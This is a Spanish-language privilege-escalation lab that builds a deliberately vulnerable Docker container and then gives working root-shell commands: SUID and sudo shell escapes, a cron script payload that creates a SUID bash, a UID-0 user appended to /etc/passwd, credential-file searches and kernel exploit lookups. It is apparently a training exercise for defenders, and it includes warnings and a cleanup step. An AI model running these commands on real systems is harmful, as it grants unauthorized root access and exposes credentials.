---
title: "Lab 03 - Escalada de Privilegios en Linux"
tags:
  - hacking
  - laboratorio
  - escalada-privilegios
tipo: laboratorio
certificacion: hacking-vault
---

# Lab 03 - Escalada de Privilegios en Linux

**Dificultad:** Media | **Duracion estimada:** 3-4 horas | **Herramientas:** LinPEAS, LinEnum, GTFOBins

## Objetivo

Partiendo de un acceso con usuario sin privilegios, practicar multiples tecnicas de escalada de privilegios en un sistema Linux deliberadamente mal configurado. Aprenderas a identificar y explotar SUID, sudo, cron jobs, permisos debiles, capabilities y exploits de kernel.

> **Advertencia:** Practica estas tecnicas exclusivamente en maquinas virtuales de tu propiedad o entornos de laboratorio autorizados. La escalada de privilegios no autorizada es un delito. Nunca ejecutes estas tecnicas en sistemas de produccion.

---

## Preparacion del Entorno

### Crear un sistema vulnerable con Docker

1. Crea el Dockerfile para el entorno de practica:

```bash
mkdir -p ~/labs/lab03-privesc && cd ~/labs/lab03-privesc

cat > Dockerfile << 'DOCKER_EOF'
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    sudo vim nano find curl wget gcc python3 \
    cron nmap netcat-openbsd openssh-server \
    && rm -rf /var/lib/apt/lists/*

# Crear usuarios
RUN useradd -m -s /bin/bash estudiante && echo "estudiante:password123" | chpasswd
RUN useradd -m -s /bin/bash admin && echo "admin:admin2024" | chpasswd

# Tecnica 1: SUID binaries
RUN cp /usr/bin/find /usr/local/bin/find-suid && chmod u+s /usr/local/bin/find-suid
RUN cp /usr/bin/vim.basic /usr/local/bin/vim-suid && chmod u+s /usr/local/bin/vim-suid
RUN cp /usr/bin/python3 /usr/local/bin/python3-suid && chmod u+s /usr/local/bin/python3-suid

# Tecnica 2: sudo misconfigurations
RUN echo "estudiante ALL=(ALL) NOPASSWD: /usr/bin/vim" >> /etc/sudoers
RUN echo "estudiante ALL=(ALL) NOPASSWD: /usr/bin/less" >> /etc/sudoers
RUN echo "estudiante ALL=(ALL) NOPASSWD: /usr/bin/nmap" >> /etc/sudoers

# Tecnica 3: Cron job vulnerable
RUN echo "#!/bin/bash\ncp /tmp/backup.sh /opt/backup.sh && bash /opt/backup.sh" > /usr/local/bin/cron-backup.sh
RUN chmod 755 /usr/local/bin/cron-backup.sh
RUN echo "* * * * * root /usr/local/bin/cron-backup.sh" >> /etc/crontab
RUN touch /tmp/backup.sh && chmod 777 /tmp/backup.sh

# Tecnica 4: Permisos debiles
RUN chmod 664 /etc/passwd

# Tecnica 5: Capabilities
RUN setcap cap_setuid=ep /usr/bin/python3.10

# Archivos con informacion sensible
RUN echo "DB_PASSWORD=SuperSecreto2024" > /opt/.env && chmod 644 /opt/.env
RUN echo "admin:admin2024" > /root/.credentials && chmod 600 /root/.credentials

USER estudiante
WORKDIR /home/estudiante
CMD ["/bin/bash"]
DOCKER_EOF
```

2. Construye y ejecuta el contenedor:

```bash
docker build -t lab-privesc .
docker run -it --name privesc-lab lab-privesc
```

3. Verifica que estas como el usuario `estudiante`:

```bash
whoami
id
```

---

## Tecnica 1: Binarios SUID

Los binarios con el bit SUID se ejecutan con los permisos de su propietario (normalmente root).

4. Busca todos los binarios con SUID activo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

5. Identifica binarios inusuales y consultalos en [GTFOBins](https://gtfobins.github.io/):

```bash
# find con SUID - ejecutar comandos como root
/usr/local/bin/find-suid . -exec /bin/bash -p \;
```

6. Escalada con python3 SUID:

```bash
/usr/local/bin/python3-suid -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

7. Verifica que obtuviste root:

```bash
whoami
id
```

> **Nota:** El flag `-p` en bash preserva los privilegios efectivos del SUID. Sin el, bash descarta los privilegios elevados.

---

## Tecnica 2: Misconfiguraciones de sudo

8. Sal de la shell root y vuelve al usuario `estudiante`. Comprueba que comandos puedes ejecutar con sudo:

```bash
sudo -l
```

9. Escalada mediante vim con sudo:

```bash
sudo vim -c '!bash'
```

10. Escalada mediante less con sudo:

```bash
sudo less /etc/hosts
# Dentro de less, escribe:
!/bin/bash
```

11. Escalada mediante nmap con sudo (versiones antiguas):

```bash
# Crear un script NSE que lance una shell
echo 'os.execute("/bin/bash")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

> **Nota:** Siempre consulta GTFOBins para ver como explotar cada binario permitido en sudo. La lista es extensa y se actualiza frecuentemente.

---

## Tecnica 3: Cron Jobs Vulnerables

12. Examina los cron jobs del sistema:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

13. Identifica el script que cron ejecuta como root y verifica permisos:

```bash
cat /usr/local/bin/cron-backup.sh
ls -la /tmp/backup.sh
```

14. El archivo `/tmp/backup.sh` es escribible. Inyecta un payload:

```bash
echo '#!/bin/bash' > /tmp/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /tmp/backup.sh
```

15. Espera a que cron ejecute el script (maximo 1 minuto) y ejecuta:

```bash
# Esperar a que aparezca el archivo
ls -la /tmp/rootbash
/tmp/rootbash -p
whoami
```

---

## Tecnica 4: Permisos Debiles en Archivos Criticos

16. Verifica los permisos de archivos sensibles:

```bash
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

17. Si `/etc/passwd` es escribible, añade un usuario root:

```bash
# Generar hash de contraseña
openssl passwd -1 -salt hacker password123
# Resultado ejemplo: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# Añadir usuario con UID 0 (root)
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

18. Inicia sesion como el nuevo usuario root:

```bash
su hacker
# Contraseña: password123
whoami
id
```

19. Busca archivos con informacion sensible accesibles:

```bash
find / -name "*.env" -o -name "*credentials*" -o -name "*password*" 2>/dev/null
cat /opt/.env
```

---

## Tecnica 5: Abuso de Capabilities

Las capabilities permiten asignar privilegios granulares a binarios sin necesidad de SUID.

20. Busca binarios con capabilities asignadas:

```bash
getcap -r / 2>/dev/null
```

21. Si python3 tiene `cap_setuid`, escala privilegios:

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

22. Otras capabilities peligrosas a buscar:

| Capability | Riesgo |
|-----------|--------|
| `cap_setuid` | Permite cambiar el UID del proceso a root |
| `cap_setgid` | Permite cambiar el GID del proceso |
| `cap_dac_override` | Ignora permisos de lectura/escritura en archivos |
| `cap_net_raw` | Permite capturar trafico de red |
| `cap_sys_admin` | Capacidad de administracion general del sistema |

---

## Tecnica 6: Exploits de Kernel (Conceptos)

23. Identifica la version del kernel:

```bash
uname -a
cat /proc/version
```

24. Busca exploits conocidos para esa version:

```bash
# Desde tu maquina atacante con searchsploit
searchsploit linux kernel <VERSION>
searchsploit linux kernel 5.15
```

25. Exploits de kernel historicos notables:

| Exploit | CVE | Kernels afectados |
|---------|-----|-------------------|
| Dirty COW | CVE-2016-5195 | 2.6.22 - 4.8.3 |
| Dirty Pipe | CVE-2022-0847 | 5.8 - 5.16.11 |
| PwnKit | CVE-2021-4034 | Polkit (no kernel, pero similar impacto) |
| GameOver(lay) | CVE-2023-2640 | Ubuntu con OverlayFS |

> **Advertencia:** Los exploits de kernel pueden causar inestabilidad, caidas o corrupcion del sistema. Usalos solo en entornos de laboratorio desechables, nunca en produccion.

---

## Enumeracion Automatizada con LinPEAS

26. Descarga y ejecuta LinPEAS para una enumeracion completa:

```bash
# Descargar LinPEAS en el objetivo
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Ejecutar y guardar salida
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

27. Revisa las secciones clave marcadas en rojo/amarillo:
    - Binarios SUID/GUID inusuales
    - Configuraciones de sudo
    - Cron jobs escribibles
    - Capabilities
    - Archivos sensibles legibles
    - Variables de entorno con credenciales

28. Alternativa con LinEnum:

```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/linenum.sh
chmod +x /tmp/linenum.sh
/tmp/linenum.sh -t
```

---

## Limpieza y Reporte

29. Documenta cada tecnica utilizada con el siguiente formato:

```markdown
## Tecnica: [Nombre]
- **Vector:** [Como se descubrio]
- **Explotacion:** [Pasos exactos]
- **Impacto:** [Que acceso se obtuvo]
- **Remediacion:** [Como corregirlo]
```

30. Destruye el entorno de laboratorio:

```bash
docker stop privesc-lab && docker rm privesc-lab
docker rmi lab-privesc
rm -rf ~/labs/lab03-privesc
```

---

## Preguntas de Evaluacion

1. Cuantos binarios SUID encontraste? Cuales no son estandar?
2. Que comandos sudo permiten escapar a una shell de root?
3. Que diferencia hay entre SUID y capabilities para la escalada?
4. Por que es peligroso que `/etc/passwd` sea escribible?
5. Que herramienta automatizada te dio mas informacion util: LinPEAS o LinEnum?

---

## Siguiente Lab

Continua con [Lab 04 - Hardening de Servidor](lab-04-hardening-servidor.md) para aprender a prevenir todas estas tecnicas de escalada.
